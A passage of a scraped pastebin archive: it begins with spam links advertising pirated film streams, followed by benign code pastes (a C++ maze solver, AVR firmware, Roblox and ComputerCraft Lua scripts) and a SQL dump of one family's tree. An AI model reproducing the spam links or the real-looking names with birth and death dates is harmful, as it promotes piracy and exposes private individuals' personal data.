https://www.taskade.com/p/the-undertaker-2023-1080p-01HFK8EMDX9004DPQV93TJ3V9P
https://player.soundon.fm/p/bf768cec-7f2c-4273-9e01-79aa70d0a2fb
https://gamma.app/public/-The-Undertaker-2023-Full-HD--on5rajni64dxfv9
https://www.taskade.com/p/the-undertaker-2023-1080-hd-thai-01HFK96RZAFXVSW52KM2N03KCC
https://gamma.app/public/-2023-Full-HD-SUB-THAI----as8o4plp4i6ss5u
https://www.taskade.com/p/hd-thai-sub-01HFK9ZG7J63203W0XAX4PBFFV
https://player.soundon.fm/p/6ce0e4ec-8744-4911-a768-3ddc679e4475
https://gamma.app/public/--HD-SUB-THAI-xr3g2veetxpdmma
https://www.taskade.com/p/2023-full-hd-01HFKAVHBT71AG1HZBQPKZ7TZ6
https://player.soundon.fm/p/a388f8c8-16ff-41a6-b4bb-caf27d6e14e8
https://gamma.app/public/Gamma-Tips-Tricks-pneyoh32oqmgi8l
https://www.taskade.com/p/2023-1080p-01HFKBT66FSRWJ1RRH4RREYWWN
https://gamma.app/public/-Tee-Yod-2023-4K-THAI-o1ivs8pd81rfuwr
https://www.taskade.com/p/tee-yod-hd-1080p-01HFKEED59SH2ZZSS1TKAFYB26
https://gamma.app/public/Izle-Ataturk-1881---1919-1-Film-Filmi-Full-2023-Ataturk-1881---19-dh60qywjy8juz82
https://www.taskade.com/p/izle-atatuerk-filmleri-1881-1919-1-film-full-filmler-online-hd-1080-p-01HFKVQ7PNKE99ZDFN0DBA3V66
https://gamma.app/public/Filmi-Tam-Surum-Ataturk-1881---1919-1-Film-2023-Turkce-altyazl-Iz-4tyzfnn7t128lmr
https://www.taskade.com/p/izle-filmi-atatuerk-1881-1919-2-film-tam-sueruem-tuerkce-dublaj-izle-mp-4-720p-1080p-01HFKZ4AJV7ZEEP38F4F00QMAZ
https://www.taskade.com/p/film-izle-atatuerk-1881-1919-1-film-2023-full-hd-1080p-tuerkce-dublaj-01HFKZD24G3BYJT1JVHD4PWRSG
https://gamma.app/public/Izle-Ataturk-1881---1919-1-Film-Full-Online-izle-HD-Turkce-iph01blwjo8gj2c"
cKuSFmGN,Untitled,maksincolf,C++,Sunday 19th of November 2023 08:21:35 AM CDT,"#include <bits/stdc++.h>

using namespace std;

// здесь я рассмотрю одну из классических задач, которые обычно классифицируют как ""путник в лабиринте""
// суть их обычно состоит в том, что нужно найти кратчайший путь между какими-то точками или что-то в таком духе
// задачу ниже я придумал только что.

// Задача: есть какой-то лабиринт n*m, где проход обозначается '.', а стена '#'.
// Выход помечен символом 'E' и имеет координаты x0, y0, в клетке x1, y1 стоит путник (клетка с символом 'P').
// Путник может ходить только в смежные клетки (то есть вверх, вниз, вправо, влево).
// Вопрос: за какое минимальное количество ходов путник выберется из лабиринта? (вывести -1, если невозможно)

/* Пример 1:
Входные данные:
6 8
6 5 2 4
.#....#.
.#.P#.#.
.####...
.......#
...###..
....E#..
Выходные:
13

Пример 2
 Входные данные:
6 8
6 5 2 4
.#....#.
.#.P#.#.
.#####..
.......#
...###..
....E#..
Выходные:
-1
 */

// смещения индексов по x и по y
// если просмотреть их в порядке, в котором они сейчас записаны то это будет так:
// вниз, вправо, вверх, влево
const int dx[4] = {1, 0, -1,  0};
const int dy[4] = {0, 1,  0, -1};

// пример смещений для коня на шахматной доске:
/*
const int dx[8] = {1, 2, 2,  1, -1, -2, -2, -1};
const int dy[8] = {2, 1,-1, -2, -2, -1,  1,  2};
 */

int main(){
    int n, m, x0, y0, x1, y1;
    cin >> n >> m >> x0 >> y0 >> x1 >> y1;

    x0--, y0--, x1--, y1--; // переводим в 0-индексацию
    // замечание: в некоторых задачах вам не могут явно дать нужные позиции (как здесь, например, путника и выхода),
    // но точно так же могут обозначить символами на карте, в таком случае нужно самим пройтись по полю и вычленить эти координаты

    vector<string> field(n);
    for (int i = 0; i < n; i++) {
        cin >> field[i];
    }

    // здесь мы в каждой клетке храним true, если мы уже были в этой клетке и нам больше нет смысла туда идти,
    // и false, если мы так до сих пор не были
    vector<vector<bool>> used(n, vector<bool>(m));

    // в нашей очереди первым числом будем хранить координату x, второй - y, а третьим числом - текущее количество ходов
    queue<int> q;
    // пушим текущую клетку
    q.push(x1);
    q.push(y1);
    q.push(0); // мы не сделали пока ходов, поэтому 0

    while(!q.empty()) {
        // достаём все наши индексы
        int x = q.front();
        q.pop();
        int y = q.front();
        q.pop();
        int z = q.front();
        q.pop();

        if (x == x0 && y == y0) { // добрались до выхода
            cout << z;
            return 0;
        }
        for (int i = 0; i < 4; i++) { // проходим по всем нашим смещениям
            int nx = x + dx[i], ny = y + dy[i]; // новые координаты, куда мы хотим пойти
            if (nx >= 0 && nx < n && ny >= 0 && ny < m) { // проверяем, не вышли ли мы за пределы поля
                if ((field[nx][ny] == '.' || field[nx][ny] == 'E') && !used[nx][ny]) { // проверяем, можем ли мы пойти в эту клетку И не были ли мы в ней уже до этого.
                    // Всё отлично, мы здесь не были и можем в неё зайти.
                    q.push(nx);
                    q.push(ny);
                    q.push(z + 1);
                    used[nx][ny] = true; // помечаем, что мы уже здесь были
                }
            }
        }
    }

    // мы не смогли найти выход (((
    cout << -1;

    return 0;
}"
vyNY61Ce,firmware prototype for memory check,anticlown,C,Sunday 19th of November 2023 07:54:23 AM CDT,"#include <mega328p.h>
#include <delay.h>

#define E PORTB.4
#define D PORTC.5
#define W PORTD.4
#define Q PORTD.5
#define A5 PORTC.0
#define A6 PORTC.1
#define A9 PORTC.2
#define A8 PORTC.3
#define A7 PORTC.4
#define A0 PORTB.3
#define A1 PORTB.2
#define A2 PORTB.1
#define A3 PORTB.0
#define A10 PORTD.7
#define A11 PORTD.6
#define A4  PORTB.5

#define ACmp(Value) if(Value != 0){\
    Value = 1;\
}

#define A(offset) A0 = offset & 0b00000000000000000000000000000001; ACmp(A0); \
   A1 = offset & 0b00000000000000000000000000000010; ACmp(A1); \
    A2 = offset & 0b00000000000000000000000000000100; ACmp(A2); \
    A3 = offset & 0b00000000000000000000000000001000; ACmp(A3); \
    A4 = offset & 0b00000000000000000000000000010000; ACmp(A4); \
    A5 = offset & 0b00000000000000000000000000100000; ACmp(A5); \
    A6 = offset & 0b00000000000000000000000001000000; ACmp(A6); \
    A7 = offset & 0b00000000000000000000000010000000; ACmp(A7); \
    A8 = offset & 0b00000000000000000000000100000000; ACmp(A8); \
    A9 = offset & 0b00000000000000000000001000000000; ACmp(A9); \
   A10 = offset & 0b00000000000000000000010000000000; ACmp(A10); \
   A11 = offset & 0b00000000000000000000100000000000; ACmp(A11); 

//Запись в память с offset = diapasonStart по offset = diapasonEnd значения = Value
void writeCycle(unsigned value, unsigned diapasonStart, unsigned diapasonEnd) {

    unsigned dataOffset = diapasonStart;
    diapasonEnd++; //Чтобы функция соответствовала требованиям (while проходил весь диапазон)
    D = value;
    E = 0;                                  
    
    while (dataOffset < diapasonEnd) {

        E = 1;
        W = 0;
        A(dataOffset)

            W = 1;
        delay_ms(20);

        W = 0;
        delay_ms(20);

        dataOffset++;
        E = 0;
    }

}

void DelayCheck(int* i) {
    *i = *i ^ 1;
    PORTC.0 = *i;
    delay_ms(200);
}

unsigned checkIsCorrect(unsigned value, unsigned diapasonStart, unsigned diapasonEnd) { // все значения равны заданному value
    unsigned dataOffset = diapasonStart;
    diapasonEnd++;
    E = 0;
    W = 0;

    while (dataOffset < diapasonEnd) {
        E = 1;
        A(dataOffset)
        
        delay_ms(20);

        if (Q != value)
            return 1;
        
        E = 0;
        dataOffset++;
    }
    return 0;
}

void main(void) {
    //writeCycle(1, 0, 4095);
    //unsigned ans = checkIsCorrect(1, 0, 4095);
    int i = 0;
    while (1) {
        i = i ^ 1;    
        delay_ms(20);
        E = i; 
    }
}"
vS5tXETe,Script for HD,jcnruad900,Lua,Sunday 19th of November 2023 07:51:10 AM CDT,"--//Services\\

local serverStorage = game:GetService(""ServerStorage"")

local replicatedStorage = game:GetService(""ReplicatedStorage"")

local collectionService = game:GetService(""CollectionService"")

--//Variables\\

local resources = serverStorage:WaitForChild(""Resources"")

local spawnedResources = workspace.SpawnedResources

local cleanupFunctions : {[Instance] : () -> ()} = {}

local currentResources : {[BasePart] : {Model|BasePart}} = {}

local resourceCheckParams = OverlapParams.new()
resourceCheckParams.FilterType = Enum.RaycastFilterType.Include
resourceCheckParams.FilterDescendantsInstances = {spawnedResources}

--//Settings\\

local difficultyBaseValue = 5

local groundTypes : {[string] : {spawnTime : {number}, resourceTypes : {string}}} = {
	[""Default""] = {
		spawnTime = {0.5, 0.6},
		resourceTypes = {""Tree"", ""Meteorite""},
		resourceLimit = 50
	}
}

local resourceTypes : {
	[string] : {model : Model, seed : {number}?, difficultyMultiplier : number?}
} = {
	[""Tree""] = {
		model = resources.Tree,--What model to pivot to specified location
		difficultyMultiplier = 0.125,
		seed = {1, 999}--Min seed, Max seed
	},
	[""Meteorite""] = {
		model = resources.Meteorite,
		difficultyMultiplier = 0.25,
		seed = {1, 999}
	},
}

--//Setup\\

local seed = math.random() --GET A SEED FOR RESOURCE GENERATION

--//Functions\\

local function randomElement(array : {any})
	return #array == 1 and array[1] or #array > 1 and array[math.random(1, #array)] or nil--if element count is 1 return first element if element count is bigger than 1 return random element otherwise return nil
end

local function removeGround(resourceGround : BasePart)
	if cleanupFunctions[resourceGround] then
		cleanupFunctions[resourceGround]()--Call cleanup function
		
		cleanupFunctions[resourceGround] = nil--Clear the cleanup function
	end
end

local function plrCharacterValid(player : Player) : boolean
	return player.Character and player.Character:FindFirstChild(""Humanoid"")
		and (player.Character :: Model&{Humanoid : Humanoid}).Humanoid.Health > 0
end--Make sure player has character, humanoid and that he has more than 0 health, 
--the weird gibberish in the middle of the condition is to silence the idiot typechecking

local function returnFurthestRange(object : Model|BasePart) : number
	local size = object:IsA(""BasePart"") and object.Size or (object :: Model):GetExtentsSize()
	--If object is a model then get its extents size, if it's a part then get its size
	
	return math.sqrt((size.X/2)^2 + (size.Z/2)^2)-- return the hypotenuse of the two dimensions halved
	--which will be equal in length to the distance between the corner and the center of the model
end

local function spawnLootTable(pos : Vector3, tableId : string)
	replicatedStorage.SpawnLootTable:Fire(tableId, pos)--Call the loot handling script to spawn loot
end

local function setupResource(resource : (Model|BasePart)&{ResourceGround : ObjectValue})--Setup resource to be handled with proximity prompts 
	local resourceData = resourceTypes[resource.Name]
	
	local proximityPrompt = Instance.new(""ProximityPrompt"")
	proximityPrompt.RequiresLineOfSight = true
	proximityPrompt.ObjectText = resource.Name
	proximityPrompt.ActionText = ""Harvest""
	proximityPrompt.MaxActivationDistance = returnFurthestRange(resource) + 5
	proximityPrompt.HoldDuration = (resourceData.difficultyMultiplier or 1) * difficultyBaseValue
	--The more difficult == The longer it takes to harvest
	proximityPrompt.Parent = resource--Create proximity prompt and parent it after giving properties
	
	proximityPrompt.Triggered:Connect(function(plr)
		if plrCharacterValid(plr) then
			spawnLootTable(resource:GetPivot().Position, resource.Name)
			
			resource:Destroy()
		end
	end)--Bind event and handle player interactions
end

local function getSpawnCFrame(resourceGround : BasePart, resourceSize : Vector3?, seedOverride : number?) : CFrame
	local seed = seedOverride or seed
	local resourceSize = resourceSize or Vector3.new()
	local noiseIndex = #currentResources[resourceGround]
	
	local cf = CFrame.new(
		(resourceGround.Size.X - resourceSize.X) * math.clamp(math.noise(noiseIndex, math.sin(noiseIndex), seed), -0.5, 0.5), 
		resourceGround.Size.Y/2,
		(resourceGround.Size.Z - resourceSize.Z) * math.clamp(math.noise(noiseIndex, math.cos(noiseIndex), seed), -0.5, 0.5)
	)--Get the X and Z position by substracting to the ground size the resource size and multiplying by clamped noise between -0.5, 0.5
	
	cf = resourceGround.CFrame:ToWorldSpace(cf)
	
	if #workspace:GetPartBoundsInBox(cf, resourceSize, resourceCheckParams) > 0 then--Check for other resource obstructions in selected cframe
		return getSpawnCFrame(resourceGround, resourceSize, seed + 0.1)-- If an obstruction is found then vary seed slightly and do a recursive function call to retry
	end
	
	return cf--Return the world cframe from the offset calculated above
end

local function setupGround(resourceGround : BasePart)
	removeGround(resourceGround)--If for some reason cleanup wasn't called last time then call it now to avoid memory leaks
	
	local groundSettings = groundTypes[resourceGround.Name or ""Default""]
	local loopTask
	
	cleanupFunctions[resourceGround] = function()--Setup a function that upon being called cleanups the thread
		if loopTask then
			task.cancel(loopTask)--If the task wasn't canceled already then cancel it
		end
	end
	
	local function spawnResource()
		local resourceId = randomElement(groundSettings.resourceTypes)--Simple return function that gets a random element
				
		if resourceId then -- if array contained at least one resoure type then spawn it and trigger with the Resource tag the client script that handles animations
			local resourceData = resourceTypes[resourceId]
			local resource = resourceData.model:Clone()

			resource:AddTag(""Resource"")
			
			local spawnCF = getSpawnCFrame(resourceGround, resource:IsA(""BasePart"") and resource.Size or resource:GetExtentsSize())
			
			resource:PivotTo(spawnCF)
			
			local resourceGroundReference = Instance.new(""ObjectValue"")
			resourceGroundReference.Name = ""ResourceGround""
			resourceGroundReference.Value = resourceGround
			resourceGroundReference.Parent = resource
			
			resource.Parent = spawnedResources--Parent it to folder in workspace after assigning properties

			table.insert(currentResources[resourceGround], resource)--Register resource in dict as spawned inside of resourceGround
		end
	end
	
	currentResources[resourceGround] = {}
		
	loopTask = task.spawn(function() --Split thread and create a new task, save task inside of an handy variable
		while true do--Wait a random amount of time between min and max, es: 10 + (20 - 10) * %R% where %R% is a float between 0 and 1
			wait(groundSettings.spawnTime[1] + (groundSettings.spawnTime[2] - groundSettings.spawnTime[1]) * math.random())
			
			if #currentResources[resourceGround] < (groundSettings.resourceLimit or 50) then
				spawnResource()--Call the spawn function
			end
		end
	end)
end

--//Setup\\

for _, resourceGround in pairs(collectionService:GetTagged(""ResourceGround"")) do
	setupGround(resourceGround)
end--Setup current existing grounds for resources to spawn

for _, resource in pairs(collectionService:GetTagged(""Resource"")) do
	setupResource(resource)
end--Setup current existing resources

--//Events\\

collectionService:GetInstanceRemovedSignal(""Resource""):Connect(function(resource)
	if resource:FindFirstChild(""ResourceGround"") then
		local groundResources = currentResources[resource.ResourceGround.Value]
		local i = table.find(groundResources, resource)

		if i then
			table.remove(groundResources, i)
		end
	end
end)

collectionService:GetInstanceAddedSignal(""Resource""):Connect(setupResource)

--Handle new spawned resources with setup function

collectionService:GetInstanceRemovedSignal(""ResourceGround""):Connect(removeGround)
collectionService:GetInstanceAddedSignal(""ResourceGround""):Connect(setupGround)--Allow new grounds to be added through scripts or clonation

---------------------------------------------------------------------------------------------------------------
--From this point onward it would be another script or module but for ease of showing and linking it in the pastebin
--I made it in the same script

--LOOT HANDLER

--//Variables\\

local items = serverStorage:WaitForChild(""Items"")

local spawnedItems = workspace.SpawnedItems

--//Settings\\

export type item = string
export type spawnedItem = {item : item, quantity : number}

export type lootEntry = {item : item, chance : number?, minQuantity : number?, maxQuantity : number?, entryGroup : string?}
--LOOT ENTRIES WITH SAME ENTRY GROUP will work on an exclusive logic, es: if entry group A has 3 items having the following rarities: 
-- 20%, 20%, 60% then, there will be a 20% chance to get the first item, another 20% chance to get the second and a 60% chance to get the third 
--but only one can be gotten
--If a loot entry gets chosen for being spawned then a random quantity between min and max will be spawned

local lootTables : {
	[string] : {lootEntry}
} = {
	[""Meteorite""] = {
		{
			item = ""Strange Artifact"",
			chance = 0.1,
			minQuantity = 1
		},
		{
			item = ""Meteorite Piece"",
			chance = 1,
			minQuantity = 1,
			maxQuantity = 4,
		},
	},
	[""Tree""] = {
		{
			item = ""Apple"",
			chance = 0.2,
			minQuantity = 1
		},
		{
			item = ""Leaf"",
			chance = 1,
			minQuantity = 3,
			maxQuantity = 4,
		},
		{
			item = ""Log"",
			chance = 1,
			minQuantity = 1,
		},
		{
			item = ""Log"",
			chance = 0.5,
			minQuantity = 1,
			entryGroup = ""A""
		},
		{
			item = ""Leaf"",
			chance = 0.5,
			minQuantity = 3,
			entryGroup = ""A""
		},
	},
}

--//Functions\\

local function insertLootEntry(spawnedItems : {spawnedItem}, lootEntry : lootEntry)
	local min = lootEntry.minQuantity or 1
	local max = lootEntry.maxQuantity or min or 1

	table.insert(spawnedItems, {item = lootEntry.item, 
		quantity = min + math.round((max - min) * math.random())
	})-- do some math to get quantity without having to check if interval is 0
end

local function spawnItem(item : string, pos : Vector3)
	local model = items:FindFirstChild(item)
	
	if model then
		model = model:Clone()
		model:PivotTo(CFrame.new(pos))--Pivot to new cframe from position
		model.Parent = spawnedItems--Spawn an already welded item
		--Not going to weld items as it would really depend heavily on what items we're dealing with and the type of game, I am keeping it shrimple
	end
end

local function calculateLootSpawn(lootTable : {lootEntry}) : {spawnedItem}
	local spawnedItems = {}-- array of items to spawn 
	local entryGroups = {}--dictionary of groups to lootentry array used in advanced percentage calculation
	
	for _, lootEntry in pairs(lootTable) do
		if lootEntry.chance then
			if lootEntry.entryGroup then-- if there's a chance defined and an entry group then add this entry to the entry group dict
				if not entryGroups[lootEntry.entryGroup] then
					entryGroups[lootEntry.entryGroup] = {}--if no array was defined for this entry group then define it
				end
				
				table.insert(entryGroups[lootEntry.entryGroup], lootEntry)-- insert entry in entry group array
				
				continue--skip cycle
			end
			--if only chance was declared then check if chance is lower than a random number between 0 and 1
			if lootEntry.chance < math.random() then
				continue--if not skip cycle
			end
		end
		
		--all checks above passed, either no chance was defined or the chance was high enough
		
		insertLootEntry(spawnedItems, lootEntry)--create spawned item object from entry and insert it in array
	end
	
	local randChance, totalChance --declare variables once to reduce cpu usage
	
	for entryGroupId, lootEntries in pairs(entryGroups) do
		randChance = math.random()--get number between 0 and 1
		totalChance = 0
		
		for _, lootEntry in pairs(lootEntries) do
			totalChance += lootEntry.chance -- counter variable used to keep track of the chance slice we're currently in
			
			if totalChance > randChance then -- check if the rand number is inside the current slice
				insertLootEntry(spawnedItems, lootEntry)--if so spawn item and break this inner loop
				
				break
			end
		end
	end
	
	return spawnedItems
end

local function spawnLoot(tableId : string, pos : Vector3)--Function to spawn loot table at pos
	local lootTable = lootTables[tableId]
	
	if lootTable then
		for _, spawnedItem in pairs(calculateLootSpawn(lootTable)) do
			for i=1, spawnedItem.quantity do-- call function {quantity} times giving it the position to spawn the item at and the item to spawn
				spawnItem(spawnedItem.item, pos)
			end
		end
	end
end

--//Events\\

replicatedStorage.SpawnLootTable.Event:Connect(spawnLoot)--Event to fire to spawn loot"
33Ap4Vje,Untitled,herhor67,MySQL,Sunday 19th of November 2023 07:38:38 AM CDT,"-- phpMyAdmin SQL Dump
-- version 5.2.1
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Nov 18, 2023 at 08:28 PM
-- Server version: 10.3.39-MariaDB-log
-- PHP Version: 8.1.16

SET SQL_MODE = ""NO_AUTO_VALUE_ON_ZERO"";
START TRANSACTION;
SET time_zone = ""+00:00"";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `herhor67vi_herhornet`
--

-- --------------------------------------------------------

--
-- Table structure for table `drzewo_ludzie`
--

CREATE TABLE `drzewo_ludzie` (
  `id` int(10) UNSIGNED NOT NULL,
  `name` varchar(50) NOT NULL DEFAULT '',
  `sex` enum('u','m','f') NOT NULL DEFAULT 'u',
  `born` date DEFAULT NULL,
  `died` date DEFAULT NULL,
  `desc` text NOT NULL DEFAULT '',
  `family` int(10) UNSIGNED DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Truncate table before insert `drzewo_ludzie`
--

TRUNCATE TABLE `drzewo_ludzie`;
--
-- Dumping data for table `drzewo_ludzie`
--

INSERT INTO `drzewo_ludzie` (`id`, `name`, `sex`, `born`, `died`, `desc`, `family`) VALUES
(1, 'Dawid Najda', 'm', '1999-12-28', NULL, '', 1),
(2, 'Sławomir Najda', 'm', '1967-03-19', NULL, '', NULL),
(3, 'Lucyna Najda', 'f', '1967-10-05', NULL, '', NULL),
(4, 'Emil Habarta', 'm', NULL, NULL, '', NULL),
(5, 'Krystyna Habarta', 'f', '1948-10-02', '2019-12-31', '', NULL),
(6, 'Anna Wisełka', 'f', NULL, NULL, '', NULL),
(7, 'Katarzyna Habarta', 'f', NULL, NULL, '', NULL),
(8, 'Joanna Niemczyk', 'f', NULL, NULL, '', NULL),
(9, 'Jan Habarta', 'm', NULL, NULL, '', NULL),
(10, 'Anna Habarta', 'f', NULL, NULL, '', NULL),
(11, 'Jan Nowak', 'm', '1925-04-05', '1956-05-03', '', NULL),
(12, 'Anna Nowak', 'f', '1929-06-23', '2013-03-21', '', NULL),
(13, 'Lubomir Najda', 'm', '1941-07-30', '2005-10-15', '', NULL),
(14, 'Wanda Zając', 'f', NULL, NULL, '', NULL),
(15, 'Andrzej Zając', 'm', '2019-01-05', NULL, '', NULL),
(16, 'Wiesław Wisełka', 'm', NULL, NULL, '', NULL),
(17, 'Piotr Najda', 'm', NULL, NULL, '', NULL),
(18, 'Małgorzata Najda', 'f', NULL, NULL, '', NULL),
(19, 'Kamila Najda', 'f', NULL, NULL, '', NULL),
(20, 'Katarzyna Najda', 'f', NULL, NULL, '', NULL),
(21, 'Jan Wissner', 'm', '1903-12-25', NULL, '', NULL),
(22, 'Maria Wissner', 'f', '1903-08-03', NULL, '', NULL),
(23, 'Janina Chwistek', 'f', NULL, NULL, '', NULL),
(24, 'Julian Najda', 'm', '1909-10-14', '1993-05-02', '', NULL),
(25, 'Eugenia Najda', 'f', '1906-02-13', '1970-04-15', '', NULL),
(26, 'Dominik Górniok', 'm', NULL, NULL, '', NULL),
(27, 'Julia Górniok', 'f', '1904-03-04', '1986-07-12', '', NULL),
(28, 'Jan Nowak', 'm', '1892-11-08', '1948-08-22', '', NULL),
(29, 'Zuzanna Nowak', 'f', NULL, NULL, '', NULL),
(30, 'Jan Warcenga', 'm', NULL, NULL, '', NULL),
(31, 'Elżbieta Warcenga', 'f', NULL, NULL, '', NULL),
(32, 'Daniel Niemczyk', 'm', NULL, NULL, '', NULL),
(33, 'Jarosław Niemczyk', 'm', NULL, NULL, '', NULL),
(34, 'Stefan Chwistek', 'm', NULL, NULL, '', NULL),
(35, 'Zofia Chrapek', 'f', NULL, NULL, '', NULL),
(36, 'Janina Brudny', 'f', NULL, NULL, '', NULL),
(37, 'Stanisław Chrapek', 'm', NULL, NULL, '', NULL),
(38, 'Alfred Brudny', 'm', NULL, NULL, '', NULL),
(39, 'Bazyli Najda', 'm', '1882-06-02', '1960-11-09', '', NULL),
(40, 'Maria Najda', 'f', '1886-04-07', '1958-04-27', '', NULL),
(41, 'Orest Najda', 'm', '1936-07-02', '2007-12-13', '', NULL),
(42, 'Elżbieta Najda', 'f', '1938-11-13', '2013-04-01', '', NULL),
(43, 'Robert Najda', 'm', '1995-11-23', '1995-12-13', '', NULL),
(44, 'Aleksy Górniok', 'm', '1932-10-23', '1982-07-28', '', NULL);

-- --------------------------------------------------------

--
-- Table structure for table `drzewo_relacje`
--

CREATE TABLE `drzewo_relacje` (
  `id` int(10) UNSIGNED NOT NULL,
  `mom` int(10) UNSIGNED DEFAULT NULL,
  `dad` int(10) UNSIGNED DEFAULT NULL,
  `date` date DEFAULT NULL,
  `desc` text NOT NULL DEFAULT ''
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Truncate table before insert `drzewo_relacje`
--

TRUNCATE TABLE `drzewo_relacje`;
--
-- Dumping data for table `drzewo_relacje`
--

INSERT INTO `drzewo_relacje` (`id`, `mom`, `dad`, `date`, `desc`) VALUES
(1, 2, 3, NULL, 'Rodzice');

--
-- Indexes for dumped tables
--

--
-- Indexes for table `drzewo_ludzie`
--
ALTER TABLE `drzewo_ludzie`
  ADD PRIMARY KEY (`id`),
  ADD KEY `family_fk` (`family`);

--
-- Indexes for table `drzewo_relacje`
--
ALTER TABLE `drzewo_relacje`
  ADD PRIMARY KEY (`id`),
  ADD KEY `mom_fk` (`mom`),
  ADD KEY `dad_fk` (`dad`);

--
-- AUTO_INCREMENT for dumped tables
--

--
-- AUTO_INCREMENT for table `drzewo_ludzie`
--
ALTER TABLE `drzewo_ludzie`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=45;

--
-- AUTO_INCREMENT for table `drzewo_relacje`
--
ALTER TABLE `drzewo_relacje`
  MODIFY `id` int(10) UNSIGNED NOT NULL AUTO_INCREMENT, AUTO_INCREMENT=2;

--
-- Constraints for dumped tables
--

--
-- Constraints for table `drzewo_ludzie`
--
ALTER TABLE `drzewo_ludzie`
  ADD CONSTRAINT `drzewo_ludzie_family_fk` FOREIGN KEY (`family`) REFERENCES `drzewo_relacje` (`id`) ON DELETE SET NULL ON UPDATE SET NULL;

--
-- Constraints for table `drzewo_relacje`
--
ALTER TABLE `drzewo_relacje`
  ADD CONSTRAINT `drzewo_relacje_dad_fk` FOREIGN KEY (`dad`) REFERENCES `drzewo_ludzie` (`id`) ON DELETE SET NULL ON UPDATE SET NULL,
  ADD CONSTRAINT `drzewo_relacje_mom_fk` FOREIGN KEY (`mom`) REFERENCES `drzewo_ludzie` (`id`) ON DELETE SET NULL ON UPDATE SET NULL;
COMMIT;

/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
"
JaAUix0H,staple,Geniusum,Lua,Sunday 19th of November 2023 06:57:45 AM CDT,"---@diagnostic disable: duplicate-set-field
-- Modern recreation of stitch
-- This can be used as a library or as a command-line tool
-- Scrolling requires buffering to be enabled, pass layout.buffer = true
-- This significantly slows down staple, enabling literally just wraps staple in a window

local function getNative()
    local i = 1
    while true do
        local n, v = debug.getupvalue(peripheral.call, i)
        if not n then break end
        if n == ""native"" then return v end
        i = i + 1
    end
    error(""peripheral.call has been overwritten!"")
end


local native = getNative()
local function fastwrap(side)
    local periph = peripheral.wrap(side) --[[@as table]]
    for k,v in pairs({peripheral.find(""modem"", function (name, wrapped)
        return not wrapped.isWireless()
    end)}) do
        if v.isPresentRemote(side) then
            local wrapped = {}
            for method, _ in pairs(periph) do
                wrapped[method] = function(...)
                    return native.call(peripheral.getName(v), ""callRemote"", side, method, ...)
                end
            end
            return wrapped
        end
    end
    error((""Peripheral %s not found.""):format(side))
end

---Create a new Stapled term object
---@param layout string[][]
---@return Monitor|Window
local function staple(layout)
    local cursorx, cursory = 1, 1
    local w, h
    local fg, bg = colors.white, colors.black
    ---@type Monitor[][]
    local monitors = {}

    ---@type {w:integer,h:integer,x:integer,y:integer}[][]
    local monitorInfo = {}
    ---@param fun fun(x: integer, y: integer, mon: Monitor)
    local function runOnAll(fun)
        for y, row in ipairs(monitors) do
            for x, mon in ipairs(row) do
                fun(x,y,mon)
            end
        end
    end

    local function updateSize()
        -- update all monitors
        for y, row in ipairs(layout) do
            monitors[y] = {}
            for x, mon in ipairs(row) do
                monitors[y][x] = fastwrap(mon) --[[@as Monitor]]
            end
        end
        w = 0
        h = 0
        runOnAll(function (x, y, mon)
            monitorInfo[y] = monitorInfo[y] or {}
            local monW, monH = mon.getSize()
            local monX, monY = 1,1
            if x > 1 then
                -- not the leftmost monitor
                local leftMonitor = monitorInfo[y][x-1]
                monX = leftMonitor.x + leftMonitor.w
            else
                h = h + monH
            end
            if y > 1 then
                -- not the topmost monitor
                local topMonitor = monitorInfo[y-1][x]
                monY = topMonitor.y + topMonitor.h
            else
                w = w + monW
            end
            monitorInfo[y][x] = {w=monW,h=monH,x=monX,y=monY}
        end)
    end
    updateSize()

    ---@param name string
    ---@param ... any
    local function callOnAll(name, ...)
        local args = table.pack(...)
        local val
        runOnAll(function (x, y, mon)
            -- if val then
            --     return
            -- end
            local success
            success, val = pcall(mon[name], table.unpack(args, 1, args.n))
            if not success then
                error((""Called %s, Errored %s""):format(name,val))
            end
        end)
        return val
    end

    ---@type Window
    local monEmu = {}

    for k,_ in pairs(monitors[1][1]) do -- allow access to window methods
        monEmu[k] = function(...)
            return callOnAll(k, ...)
        end
    end

    function monEmu.setCursorPos(x,y)
        cursorx = x
        cursory = y
        runOnAll(function (mx, my, mon)
            local monInfo = monitorInfo[my][mx]
            mon.setCursorPos(x-monInfo.x+1,y-monInfo.y+1)
        end)
    end

    function monEmu.blit(text, textColor, backgroundColor)
        runOnAll(function (x, y, mon)
            mon.blit(text, textColor, backgroundColor)
        end)
        cursorx = cursorx + #text
    end

    function monEmu.getCursorPos()
        return cursorx, cursory
    end

    function monEmu.getSize()
        return w, h
    end

    function monEmu.write(text)
        runOnAll(function (x, y, mon)
            mon.write(text)
        end)
        cursorx = cursorx + #text
    end

    function monEmu.getPaletteColor(col)
        return monitors[1][1].getPaletteColor(col)
    end
    monEmu.getPaletteColour = monEmu.getPaletteColor

    monEmu.setCursorPos(1,1)

    function monEmu.setTextScale(scale)
        for yp, row in ipairs(monitors) do
            for xp, win in ipairs(row) do
                win.setTextScale(scale)
            end
        end
        updateSize()
    end

    function monEmu.scroll(y)
        error(""Staple needs to be buffered for scrolling to work."")
    end

    local win = monEmu
    if layout.buffer then
        win = window.create(monEmu, 1, 1, w, h)
        function win.setTextScale(scale)
            monEmu.setTextScale(scale)
            win.reposition(1,1,w,h)
        end
    end
    return win
end

---Load a stapled term object from a file
---@param filename string
---@return Monitor|Window
local function loadStaple(filename)
    local f = assert(fs.open(filename, ""r""))
    local d = assert(textutils.unserialise(f.readAll() --[[@as string]]), ""Invalid file."") --[[@as table]]
    f.close()
